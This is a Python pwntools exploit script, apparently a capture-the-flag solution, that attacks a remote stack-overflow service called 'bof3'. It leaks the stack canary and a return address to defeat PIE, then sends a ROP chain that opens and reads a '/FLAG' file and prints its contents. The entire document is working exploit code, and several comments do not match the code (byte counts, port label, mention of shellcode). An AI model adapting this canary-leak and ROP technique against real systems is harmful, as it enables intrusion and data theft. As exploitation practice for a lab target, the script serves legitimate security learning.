from pwn import *
# --- Pwntools Setup ---
context.clear(arch='amd64')
# context.log_level = 'debug' # Uncomment for more detailed pwntools logging

# --- Configuration ---
HOST = "up.zoolab.org"
PORT = 12344 # Port for bof2
BINARY_NAME = "./bof3"

elf = ELF(BINARY_NAME)

# --- Offsets Provided by User from GDB for bof2 ---
# Stage 1: Canary Leak via buf1
OFFSET_BUF1_TO_CANARY_PADDING = 185 # 185 bytes ('A's to send) c0-08+1

# Stage 2: RIP Leak via buf2 (for PIE calculation)
# This padding fills buf2, buf3, canary slot, and RBP slot with non-nulls
OFFSET_BUF2_TO_RBP_SLOT_PADDING = 0x98 # 96 bytes ('B's to send) 0x90 + 08
# These are for calculating msg_address from the leaked RIP
OFFSET_LEAKED_POINT_FROM_BASE = 0x9c83 # Offset of (task's saved RIP in main) from binary base 0x9bf9 + 138

# Stage 3: Overwrite RIP via buf3
PADDING_BUF3_TO_CANARY_SLOT = 0x28 # 32 bytes ('C's to send)
JUNK_RBP_IN_BUF3_PAYLOAD_LEN = 8   # 8 bytes ('D's for RBP slot)

OFFSET_POP_RDI = 0xbc33  # Example: 0x000000000000bc33
OFFSET_POP_RSI = 0xa7a8  # Example: 0x000000000000a7a8
OFFSET_POP_RDX = 0x15f6e  # Example: 0x0000000000015f6e
OFFSET_POP_RAX = 0x66287  # Example: 0x0000000000066287
OFFSET_SYSCALL = 0x30ba6  # Example: 0x0000000000030ba6
# --- Main Exploit Logic ---
def exploit():
    p = remote(HOST, PORT)

    p.recvuntil(b"===========================================\n")
    p.recvuntil(b"Welcome to the UNIX Hotel Messaging Service\n")
    p.recvuntil(b"===========================================\n")

    # --- STAGE 1: Leak Canary via buf1 ---
    log.info(f"Stage 1: Sending {OFFSET_BUF1_TO_CANARY_PADDING} 'A's to buf1 to leak canary...")
    padding_for_canary_leak = b'A' * OFFSET_BUF1_TO_CANARY_PADDING
    # Using sendafter for prompt, and send for exact payload bytes.
    # User requested sendline: if read expects newline for processing before printf, this might be needed.
    # However, for filling buffers precisely before a printf %s that reads stack, 'send' is often safer.
    # Let's use send() for the payload part for precision.
    p.recvuntil(b"\nWhat's your name? ")
    p.send(padding_for_canary_leak)
    p.recvuntil(b"Welcome, ")
    p.recvuntil(padding_for_canary_leak) # Consume the echoed 'A's
    
    # The next 7 bytes are the non-null part of canary. Canary LSB is \x00.
    # Then server prints "\nWhat's the room number? "
    leaked_canary_7_bytes = p.recv(7) # Read exactly 7 bytes
    
    if len(leaked_canary_7_bytes) != 7:
        log.failure(f"Canary Leak: Expected 7 bytes, got {len(leaked_canary_7_bytes)}: {leaked_canary_7_bytes.hex()}")
        return
    # leaked_canary = u64(leaked_canary_7_bytes.rjust(8, b'\x00'))
    leaked_canary = u64(leaked_canary_7_bytes.rjust(8, b'\x00'), endian='little')
    log.success(f"Canary Leak: Leaked 7 bytes: {leaked_canary_7_bytes.hex()}. Full canary: {hex(leaked_canary)}")
    # p.recvuntil(b"\nWhat's the room number? ") # Consume rest of line to sync for next stage
    print(f"{p.recv(1024).hex()}") # rbp value.

    # --- STAGE 2: Leak Task Return Address (RIP) via buf2 (for PIE) ---
    log.info(f"Stage 2: Sending {OFFSET_BUF2_TO_RBP_SLOT_PADDING} 'B's to buf2 to leak RIP...")
    padding_for_rip_leak = b'B' * OFFSET_BUF2_TO_RBP_SLOT_PADDING
    # This payload smashes buf2, buf3, canary slot, and RBP slot with 'B's (non-null)
    p.sendafter(b"What's the room number? ", padding_for_rip_leak) # sendline as per user note earlier for 0x88

    p.recvuntil(b"The room number is: ")
    p.recvuntil(padding_for_rip_leak.rstrip(b'\n')) # Consume echoed 'B's (rstrip \n if sendline added one)
                                                 # Or if sendline was for payload, it may include \n in padding_for_rip_leak

    # After the 'B's, printf continues and should print the 8-byte saved RIP
    # Then server prints "\nWhat's the customer's name? "
    leaked_rip_bytes = p.recv(8) # Read exactly 8 bytes for RIP
    log.info(f"Leaked raw bytes: {leaked_rip_bytes.hex()}")    
    leaked_actual_ret_addr = u64(leaked_rip_bytes.ljust(8, b'\x00'))
    log.success(f"RIP Leak: Leaked task return address: {hex(leaked_actual_ret_addr)}")
    executable_base = leaked_actual_ret_addr - OFFSET_LEAKED_POINT_FROM_BASE
    elf.address = executable_base # important for set exe base
    log.success(f"Calculated executable base: {hex(executable_base)}")
    p.recvuntil(b"\nWhat's the customer's name? ", timeout=1) # Sync for next stage
    padding_msg_to_canary = 40
    
    rop = ROP(elf)
    
    flag_path_addr = elf.bss() + 0x200 # Put "/FLAG\0" here
    read_buffer_addr = elf.bss() + 0x200 + 0x20 # Put flag content here

    log.info(f"ROP: Address for '/FLAG': {hex(flag_path_addr)}")
    log.info(f"ROP: Address for read buffer: {hex(read_buffer_addr)}")

    # ROP Chain:
    # 1. read(0, flag_path_addr, 8)  ; to read "/FLAG\0\0\0" from stdin
    rop.read(0, flag_path_addr, 8)
    # 2. open(flag_path_addr, O_RDONLY=0)
    rop.open(flag_path_addr, 0) # rax = fd
    log.warning("ROP: Assuming fd=3 for read. Proper solution should use open's return value.")
    rop.read(3, read_buffer_addr, 100) # fd=3 (placeholder)
    # 4. write(1, read_buffer_addr, 100) ; Assume 100 bytes read
    rop.write(1, read_buffer_addr, 100)
    # 5. exit(0)
    rop.exit(0)

    rop_chain_bytes = rop.chain()
    log.info(f"ROP chain (length {len(rop_chain_bytes)}):\n{rop.dump()}")

    junk = u64(b'A' * 8)
    
    final_payload = b'X' * padding_msg_to_canary # Fill local msg up to canary
    final_payload += p64(leaked_canary)
    final_payload += p64(junk)            # Overwrite task's saved RBP
    final_payload += rop_chain_bytes           # ROP chain starts at return address

    # The final read is into the local `msg` buffer.
    # The prompt "\nWhat's the customer's name? " was consumed.
    # Now, satisfy the read for buf3 (customer name), then the final read for msg.
    log.info("Satisfying read into buf3 (customer's name)...")
    p.sendline(b"CustomerX") # For buf3 (rbp-0x60 based on corrected GDB)

    p.recvuntil(b"Leave your message: ") # This is for the read into local msg[40]
    log.info(f"Sending final ROP overflow payload ({len(final_payload)} bytes) to local msg buffer...")
    p.send(final_payload) # Send ROP chain. read is 384 bytes, should take it.
                          # Does not add newline, ROP chain should end with exit.
    
    # After sending the ROP chain, the ROP chain's read(0, flag_path_addr, 8) executes.
    # We need to send "/FLAG\0" for it.
    time.sleep(1.0) # Give a moment for ROP chain to reach the read syscall
    log.info("Sending '/FLAG\\0' for ROP chain's read()...")
    p.send(b"/FLAG\0\0\0") # Send 8 bytes, "/FLAG" is 6 bytes with null.
    # --- STAGE 5: Receive the flag ---
    log.success("Payloads sent. Shellcode should execute. Waiting for flag...")
    try:
        flag_output = p.recvall(timeout=2.0) 
        log.info("Received from server:")
        if flag_output:
            decoded_output = flag_output.decode(errors='replace').strip()
            print(decoded_output)
            if not decoded_output or "Thank you!" in decoded_output and len(decoded_output.replace("Thank you!","").strip()) == 0 :
                log.warning("Flag not clearly present or only 'Thank you!' received.")
        else:
            log.warning("No output received for flag.")
    except PwnlibException as e:
        log.failure(f"Error receiving flag: {e}")
    finally:
        p.close()

if __name__ == "__main__":
    try:
        exploit()
    except Exception as e:
        log.critical(f"An unexpected Python error occurred: {e}")